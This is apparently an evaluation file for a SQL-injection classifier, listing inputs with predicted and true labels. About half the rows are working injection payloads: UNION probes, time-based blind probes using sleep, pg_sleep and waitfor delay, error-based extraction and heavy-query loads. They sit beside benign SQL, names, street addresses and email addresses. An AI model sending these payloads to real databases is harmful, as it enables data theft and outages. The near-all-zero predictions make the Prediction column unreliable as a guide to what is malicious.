,Query,Prediction,Actual
13610,SELECT * FROM wood 3,0,0.0
13611,"  SELECT Orders.intorID, Employees.exact, Employees.grain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.keptID ORDER BY Orders.lossID",0,0.0
13612,SELECT TOP 3 * FROM stage,0,0.0
13613,select   (  case when   (  9455  =  6007  )   then 9455 else 9455*  (  select 9455 from mysql.db  )   end  )  #,0,1.0
13614,SELECT * FROM had WHERE keep = 'claws',0,0.0
13615," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",0,1.0
13616,-9826 where 4103  =  4103 order by 1#,0,1.0
13617,SELECT * FROM sport WHERE fighting = 'dropped' LIMIT 3,0,0.0
13618,"   SELECT COUNT ( trip ) , apart FROM fish BY rain",0,0.0
13619,1'  )   where 5214  =  5214,0,1.0
13620," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",0,1.0
13621,"1'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",0,1.0
13622,ve4t4nal,0,0.0
13623,SELECT * FROM you WHERE railroad = 'damage' LIMIT 3,0,0.0
13624,5n37do,0,0.0
13625,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl,0,1.0
13626,SELECT * FROM surface WHERE trap = 'iron',0,0.0
13627,-9355' or   (  8459  =  8459  )  *4906 and 'aegf'  =  'aegf,0,1.0
13628,donaldo,0,0.0
13629," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",0,1.0
13630,"1""  )   where 3679  =  3679",0,1.0
13631,select   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  select 6002 from mysql.db  )   end  )  #,0,1.0
13632,"plaa doctor robert, 127",0,0.0
13633,79,0,0.0
13634,cooperma,0,0.0
13635,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'eihl'  =  'eihl,0,1.0
13636,gemma,0,0.0
13637,"escultor bauls, 96,",0,0.0
13638,select   (  case when   (  7645  =  5921  )   then 7645 else 7645*  (  select 7645 from information_schema.character_sets  )   end  )  #,0,1.0
13639,select   (  case when   (  8642  =  6049  )   then 1 else 8642*  (  select 8642 from master..sysdatabases  )   end  )  --,0,1.0
13640,"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",0,1.0
13641,SELECT * FROM CustomersLIMIT 3;,0,0.0
13642,1  )   where 5418  =  5418 union all select null--,0,1.0
13643,fnico,0,0.0
13644,1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'esal'  =  'esal,0,1.0
13645,SELECT TOP 3 * FROM somehow,0,0.0
13646,SELECT MIN ( plastic )  AS rocket FROM earlier,0,0.0
13647,SELECT cloth FROM kept,0,0.0
13648,"   SELECT opposite, situation, foot FROM soft WHERE buffalo  IS NULL",0,0.0
13649,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,0,1.0
13650,llambilles,0,0.0
13651,SELECT DISTINCT art FROM if,0,0.0
13652,SELECT AVG ( Price ) FROM deal,0,0.0
13653," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",0,1.0
13654,"1  )   and elt  (  3138  =  1817,1817  )  ",0,1.0
13655,"1'||  (  select 'jscc' from dual where 3266  =  3266 and elt  (  4249  =  4249,7259   )    )   ||'",0,1.0
13656,SELECT * FROM port FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM forgotten,0,0.0
13657,"   SELECT Employees.accident, COUNT ( Orders.rhythmID )  AS meantFROM    ( OrdersINNER JOIN division ON Orders.stripID  =  Employees.takenID ) ",0,0.0
13658,quilley0@frenchpolynesia.com.st,0,0.0
13659,54011879j,0,0.0
13660,SELECT TOP 50 PERCENT * FROM picture SELECT * FROM rod FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,0,0.0
13661,-3978 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- mtun,0,1.0
13662,"1'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1.0
13663,luna,0,0.0
13664,"  SELECT seriousID AS ID, law AS doll FROM view",0,0.0
13665,"1'+  (  select ounb where 4653  =  4653 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",0,1.0
13666,1'+  (  select smze where 5616  =  5616,0,1.0
13667,itero del castillo,0,0.0
13668,"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'qbdm'  =  'qbdm",0,1.0
13669,SELECT * FROM struggle WHERE until IN  ( SELECT hot FROM happen ) ,0,0.0
13670,50830,0,0.0
13671,SELECT * FROM cow 3 SELECT * FROM high,0,0.0
13672,1'||  (  select 'pyga' from dual where 8501  =  8501 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,0,1.0
13673,SELECT balloon ( s )  FROM correctly,0,0.0
13674,SELECT * FROM surrounded WHERE send = 'brush' FETCH FIRST 3 ROWS ONLY,0,0.0
13675, ,0,1.0
13676,SELECT AVG ( while ) FROM early,0,0.0
13677,6287,0,0.0
13678,SELECT AVG ( immediately )  FROM basic  SELECT SUM ( her ) ,0,0.0
13679,SELECT * FROM spend WHERE because BETWEEN 'union' AND 'remember',0,0.0
13680,promanar,0,0.0
13681," SELECT * FROM five ORDER BY limited, off",1,0.0
13682,1'   )    )    as kgfp where 2366  =  2366,0,1.0
13683,"-1079""  )   where 2865  =  2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",0,1.0
13684,SELECT * FROM plus WHERE close BETWEEN 'army' AND 'thee',0,0.0
13685,SELECT * FROM eventually 3 SELECT * FROM held,0,0.0
13686,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",0,1.0
13687,"   SELECT COUNT ( means ) , tent FROM cause BY make",0,0.0
13688,SELECT option_value FROM wp_options WHERE option_name  =  '_options_number_of_preferred_partners' LIMIT 1,0,0.0
13689,argeo,0,0.0
13690,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3#",0,1.0
13691,"1  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1.0
13692,1'+  (  select 'ggkm' where 3394  =  3394,0,1.0
13693,SELECT MIN ( while )  AS excited FROM whole,0,0.0
13694,"1%""   )    )    waitfor delay '0:0:5'--",0,1.0
13695,chuanhsi,0,0.0
13696,SELECT * FROM opinion ORDER BY forgot,0,0.0
13697,SELECT * FROM she 3 SELECT * FROM further,0,0.0
13698,SELECT TOP 3 * FROM theory WHERE friendly = 'he',0,0.0
13699,SELECT * FROM accept WHERE condition IN  ( SELECT nearby FROM gift ) ,0,0.0
13700,SELECT * FROM bottom WHERE clear = 'underline' LIMIT 3,0,0.0
13701,SELECT TOP 3 * FROM paint SELECT * FROM prove 3SELECT * FROM certain,0,0.0
13702, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,0,1.0
13703,81568460h,0,0.0
13704,1'   )    )    as zari where 6847  =  6847,0,1.0
13705,SELECT attention ( s )  FROM trunk UNION,0,0.0
13706,jande,1,0.0
13707,SELECT FROM_DAYS ( 685467 ) ;,0,0.0
13708,"iif  (  9875  =  8961,1,1/0  )  ",0,1.0
13709,strucak@cortell.cat,0,0.0
13710,   ( SELECT column_name  FROM table_name  WHERE condition  ) ;,0,0.0
13711,SELECT * FROM town FETCH FIRST 50 PERCENT ROWS ONLY,0,0.0
13712,SELECT * FROM beautiful,0,0.0
13713,select,0,1.0
13714,SELECT * FROM greater FETCH FIRST 50 PERCENT ROWS ONLY,0,0.0
13715,chuvalo@ppmanzanares.nc,0,0.0
13716,"  SELECT eggID AS ID, national AS pay FROM carry",0,0.0
13717,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",0,1.0
13718,l9n0e7no,0,0.0
13719,3549,0,0.0
13720,mario,0,0.0
13721,theo,0,0.0
13722,"-6214"" union all select 3323,3323#",0,1.0
13723,masegosa,0,0.0
13724,35591968c,0,0.0
13725,"-4721'  )   or elt  (  4378  =  5165,5165  )   and   (  'fufn'  =  'fufn",0,1.0
13726,"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'kqip' like 'kqip",0,1.0
13727,gu5cima,0,0.0
13728,menospreciativo,0,0.0
13729,SELECT AVG ( Price ) FROM him,0,0.0
13730,-7199' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'qibr'  =  'qibr,0,1.0
13731,SELECT * FROM electricity WHERE street NOT BETWEEN 'kitchen' AND 'made',0,0.0
13732,SELECT care ( s FROM charge RIGHT JOIN,0,0.0
13733,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'sjxp' like 'sjxp",0,1.0
13734,SELECT * FROM nine WHERE split BETWEEN '1996-07-01' AND '1996-07-31',0,0.0
13735,1'+  (  select 'stdl' where 4581  =  4581,0,1.0
13736,alfamn,0,0.0
13737,19310,0,0.0
13738,SELECT purple FROM grabbed UNION SELECT tea FROM careful ORDER BY character,0,0.0
13739,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'hofy' like 'hofy",0,1.0
13740,SELECT supply,0,0.0
13741,SELECT MIN ( box )  AS film FROM tie,0,0.0
13742,65658514t,0,0.0
13743,SELECT * FROM native WHERE couple = 'hard',0,0.0
13744,breon@sexotelefono.mc,0,0.0
13745,SELECT * FROM definition,0,0.0
13746,agn,0,0.0
13747,volkmann_parfrey1@sigloventidos.be,0,0.0
13748,"1'||  (  select 'epjr' from dual where 3074  =  3074 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,1.0
13749,SELECT * FROM rubbed,0,0.0
13750,moncada,0,0.0
13751,"SELECT UCASE ( ""SQL Tutorial is FUN!"" ) ; ",0,0.0
13752,"calle manzanilla 141,",0,0.0
13753,otia,0,0.0
13754,"1"" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",0,1.0
13755,8912,0,0.0
13756,"1"" union all select null,null,null,null,null,null,null,null,null--",0,1.0
13757,SELECT * FROM feed WHERE    NOT country = 'herself',0,0.0
13758,select sleep  (  5  )   and   (  4863  =  4863,0,1.0
13759,1  )   waitfor delay '0:0:5' and   (  2993  =  2993,0,1.0
13760,darby,0,0.0
13761,SELECT * FROM individual WHERE situation NOT LIKE 'ship%',0,0.0
13762,inmol4dor,0,0.0
13763,navratil@sindns.as,0,0.0
13764,t1iesti70,0,0.0
13765,"1%'   )    )     )   union all select null,null,null,null--",0,1.0
13766,SELECT * FROM stop WHERE diameter = 'was' FETCH FIRST 3 ROWS ONLY,0,0.0
13767,"1'||  (  select 'scqw' where 3337  =  3337 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",0,1.0
13768,longhurst-street1@drae2.pa,0,0.0
13769,ivancevi,0,0.0
13770,"  SELECT * FROM later WHERE putting IN  ( 'soldier', 'ear', 'writing' )  ",0,0.0
13771,SELECT bottle FROM boy,0,0.0
13772,946,0,0.0
13773,DELETE FROM class WHERE rubbed = 'sold',0,0.0
13774,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",0,1.0
13775,4358,0,0.0
13776,SELECT * FROM bell WHERE sheep = 'accurate'  AND  ( steel = 'drive' OR column = 'mouth' ) ,0,0.0
13777,SELECT * FROM sing WHERE Price NOT BETWEEN 10 AND 20,0,0.0
13778,SELECT TOP 3 * FROM aware WHERE after = 'doing',0,0.0
13779,blakley@asyra.ao,0,0.0
13780,SELECT suppose ( s ) FROM rose INNER JOIN,0,0.0
13781,19219,0,0.0
13782,SELECT MIN ( am )  AS television FROM can,0,0.0
13783,SELECT * FROM noted FETCH FIRST 50 PERCENT ROWS ONLY,0,0.0
13784,"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",0,1.0
13785,monti,0,0.0
13786,1'  )   as pwqs where 2291  =  2291,0,1.0
13787,-6310 or 6715  =  3399,0,1.0
13788,select case when 1613  =  2937 then 1 else null end--,0,1.0
13789,dao,0,0.0
13790,SELECT * FROM experiment WHERE foot LIKE '%store%',0,0.0
13791,atrazar,0,0.0
13792,SELECT * FROM lovely FETCH FIRST 50 PERCENT ROWS ONLY,0,0.0
13793,alcojor larenas,0,0.0
13794,"1"" where 9669  =  9669",0,1.0
13795,1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,0,1.0
13796,"-5776%' union all select 3075,3075,3075,3075,3075--",0,1.0
13797,SELECT TOP 50 PERCENT * FROM atom,0,0.0
13798,SELECT * FROM couple WHERE try = 'pupil'  OR body = 'orbit',0,0.0
13799,chrysa2,0,0.0
13800,"1'   )    )    as peeo where 5356  =  5356 and elt  (  4722  =  2382,2382  )  --",0,1.0
13801,"1'||  (  select 'xuof' from dual where 8794  =  8794 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,1.0
13802,"  SELECT fullID AS ID, whether AS exercise FROM speech",0,0.0
13803,1'   )    )    rlike   (  select   (  case when   (  3876  =  2077  )   then 1 else 0x28 end   )    )    and    (    (   'hqcz' like 'hqcz,0,1.0
13804,3690,0,0.0
13805,andara francino,0,0.0
13806,"-5728  )   where 8663  =  8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",0,1.0
13807,SELECT DISTINCT visit FROM creature,0,0.0
13808,"  SELECT river AS mainly, least AS [friend]  FROM exactly",0,0.0
13809,SELECT owner FROM flies UNION SELECT circus FROM onto ORDER BY collect,0,0.0
13810,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",0,1.0
13811,av. del mar cantabrico 176 6-d,0,0.0
13812,oxendine,1,0.0
13813," SELECT * FROM hurt ORDER BY longer, me",0,0.0
13814,SELECT TOP 3 * FROM everybody SELECT * FROM treated 3SELECT * FROM river,0,0.0
13815,"  SELECT creature AS mighty, adult AS [serious]  FROM hair",0,0.0
13816,"SELECT * FROM real WHERE evidence BETWEEN ""complex"" AND    ""whether""",0,0.0
13817,SELECT COUNT ( edge )  FROM property,0,0.0
13818,27253689t,0,0.0
13819,1'  )   where 3588  =  3588,0,1.0
13820,SELECT * FROM title 3,0,0.0
13821,"1""  )   as ivkw where 4218  =  4218 union all select null--",0,1.0
13822,"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",0,1.0
13823,"1%"" union all select null,null,null--",0,1.0
13824,"1%' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",0,1.0
13825,SELECT AVG ( farm )  FROM stone  SELECT SUM ( instant ) ,0,0.0
13826,"1'||  (  select 'gboi' where 4191  =  4191 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",0,1.0
13827,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual--",0,1.0
13828,"1%""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""%""  =  """,0,1.0
13829,1056,0,0.0
13830,SELECT TOP 50 PERCENT * FROM kept,0,0.0
13831,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,0,1.0
13832,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",0,1.0
13833,SELECT TOP 3 * FROM round SELECT * FROM pig 3SELECT * FROM pan,0,0.0
13834,"marcelino suarez 39,",0,0.0
13835,"1,  (  select   (  case when   (  5217  =  5217  )   then 1 else 5217*  (  select 5217 from mysql.db  )   end   )    )   ",0,1.0
13836,-2316'   )    )     )   or 8519  =  6010,0,1.0
13837,-3088' or 6872  =  6872 and 'miwk'  =  'miwk,0,1.0
13838,SELECT * FROM join WHERE bad = 'rain'  OR silent = 'possible',0,0.0
13839,8534,0,0.0
13840,magdalen1,0,0.0
13841,SELECT COUNT ( major ) FROM sets,0,0.0
13842,50490,0,0.0
13843,camisoln,0,0.0
13844,select   (  case when   (  3325  =  1767  )   then 3325 else 3325*  (  select 3325 from mysql.db  )   end  )  #,0,1.0
13845,SELECT replace ( s )  FROM cause,0,0.0
13846,17130,0,0.0
13847," SELECT FIELD ( ""Q"", ""s"", ""q"", ""l"" ) ; ",0,0.0
13848,"1   )    )     )   union all select null,null,null,null,null,null#",0,1.0
13849,SELECT AVG ( labor )  FROM mark  SELECT SUM ( writer ) ,0,0.0
13850,SELECT AVG ( beginning ) FROM lower SELECT SUM ( exchange ) ,0,0.0
13851,select   (  case when   (  2501  =  4688  )   then 2501 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,0,1.0
13852,SELECT * FROM occur FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM liquid,0,0.0
13853,3407,0,0.0
13854,SELECT large ( s FROM wagon RIGHT JOIN,0,0.0
13855,9.7668E+15,1,0.0
13856,SELECT * FROM bone WHERE blue = 'situation' FETCH FIRST 3 ROWS ONLY,0,0.0
13857,7.13887E+14,0,0.0
13858,inistola,0,0.0
13859,"-5573'  )   union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",0,1.0
13860,1   )    )     )   waitfor delay '0:0:5'--,0,1.0
13861,kovacs,0,0.0
13862,-2504'   )    )     )   or 8723  =  9715,0,1.0
13863,pechur@spainbareback.fm,0,0.0
13864,SELECT * FROM shallow WHERE wheel BETWEEN '1996-07-01' AND '1996-07-31',0,0.0
13865,06363808f,0,0.0
13866,parke antonio trueba 175,0,0.0
13867,"-9577'||  (  select 'vloa' from dual where 7184  =  7184 union all select 7184,7184#",0,1.0
13868,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,0,1.0
13869,SELECT TOP 3 * FROM hardly WHERE interior = 'cannot',0,0.0
13870,"pl. cantarranillas 21,",0,0.0
13871,valdivieso,0,0.0
13872,SELECT MIN ( smell )  AS party FROM medicine,1,0.0
13873,horgan,0,0.0
13874,SELECT zero,0,0.0
13875,8.2197E+15,0,0.0
13876,"1%"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""%""  =  """,0,1.0
13877,SELECT four ( s )  FROM accurate UNION,0,0.0
13878,"-6554'   )    )     )   union all select 4384,4384,4384,4384,4384#",0,1.0
13879,barbads,0,0.0
13880,"  SELECT ifID AS ID, friendly AS care FROM card",0,0.0
13881,1  )   where 3936  =  3936,0,1.0
13882,SELECT thank,0,0.0
13883,"1""  )   where 7914  =  7914 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",0,1.0
13884,-2569' union all select 4484--,0,1.0
13885,SELECT * FROM  ( SELECT flew FROM essential ) ,0,0.0
13886,"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye",0,1.0
13887,select   (  case when   (  1412  =  5313  )   then 1412 else 1412*  (  select 1412 from mysql.db  )   end  )  #,0,1.0
13888,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,0,1.0
13889,"   SELECT listen,income,neck,warn,quietly     (  (  spirit JOIN girl ON jar.dress =  burst.sound )   INNER JOIN stomachON Orders.solid =  voyage.pastID ) ",0,0.0
13890,"  SELECT * FROM blow WHERE draw IN  ( 'brown', 'coming', 'biggest' )  ",0,0.0
13891,"1%""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1.0
13892,"1""  )   where 6236  =  6236 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",0,1.0
13893,SELECT * FROM said ORDER BY subject,0,0.0
13894,bollullos par del condado,0,0.0
13895," select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",0,1.0
13896,balcells parets,0,0.0
13897,"1  )   and elt  (  7425  =  8842,8842  )   and   (  9194  =  9194",0,1.0
13898,"1%""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",0,1.0
13899,1' where 2673  =  2673,0,1.0
13900,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",0,1.0
13901,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537",0,1.0
13902,"1""   )    )    as oxrr where 6141  =  6141 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,1.0
13903,45183,0,0.0
13904,SELECT * FROM her FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM driving,0,0.0
13905,"  SELECT * FROM getting WHERE nine IN  ( 'string', 'bone', 'judge' )  ",0,0.0
13906,frerichs@underdog.as,0,0.0
13907,SELECT * FROM sudden WHERE ourselves = 'stairs' FETCH FIRST 3 ROWS ONLY,0,0.0
13908,SELECT DISTINCT father FROM yard,0,0.0
13909,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",0,1.0
13910,42836631m,0,0.0
13911,"1%""   )    )    and 8316  =  6410#",0,1.0
13912,kimbroug,0,0.0
13913,SELECT shore FROM land UNION ALL SELECT president FROM feel ORDER BY race,0,0.0
13914,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",0,1.0
13915,SELECT * FROM CustomersLIMIT 3;SELECT * FROM Customers,0,0.0
13916,"calle isis, 180",0,0.0
13917,SELECT * FROM driving WHERE habit NOT BETWEEN 'fully' AND 'chart',0,0.0
13918,"1""   )    )    as tljw where 8474  =  8474 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",0,1.0
13919,SELECT COUNT ( pack )  FROM someone,0,0.0
13920,or 'text'   =   n'text',0,1.0
13921,"1  )   where 5261  =  5261 and elt  (  1210  =  1210,sleep  (  5   )    )   --",0,1.0
13922,"  SELECT felt,seen FROM away WHERE fur = 'lie' UNION SELECT enemy, charge FROM become",0,0.0
13923,SELECT COUNT ( comfortableID ) FROM tree,0,0.0
13924,-9120'   )    )    or 8571  =  8571--,0,1.0
13925,62,0,0.0
13926,SELECT COUNT ( bareID ) FROM riding,0,0.0
13927,SELECT ring FROM adult,0,0.0
13928,71648159p,0,0.0
13929,"   SELECT range,nuts,individual,hospital,present     (  (  continent JOIN move ON beat.grass =  weak.hungry )   INNER JOIN accidentON Orders.current =  chest.trafficID ) ",0,0.0
13930,1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,0,1.0
13931,"-9613""   )    )     )   or elt  (  3125  =  7084,7084  )   and    (    (     (  ""pupl""  =  ""pupl",0,1.0
13932,flixmara,0,0.0
13933,98946031p,0,0.0
13934,7361,0,0.0
13935,17536,0,0.0
13936,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""squx"" like ""squx",0,1.0
13937,SELECT AVG ( hardly ) FROM by,0,0.0
13938,"c/ poeta bernardo de la torre 10,",0,0.0
13939,SELECT fine ( s )  FROM secret SELECT sea FROM nails,0,0.0
13940," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",0,1.0
13941,SELECT * FROM tea WHERE captain NOT BETWEEN 'just' AND 'park',0,0.0
13942,"-8491"" where 9043  =  9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",0,1.0
13943,1'  )   where 2330  =  2330 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,0,1.0
13944,-5299 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,0,1.0
13945,SELECT MIN ( recent )  AS bring FROM sense,0,0.0
13946,SELECT Count ( * )  AS basket,0,0.0
13947,open3,0,0.0
13948,merl,0,0.0
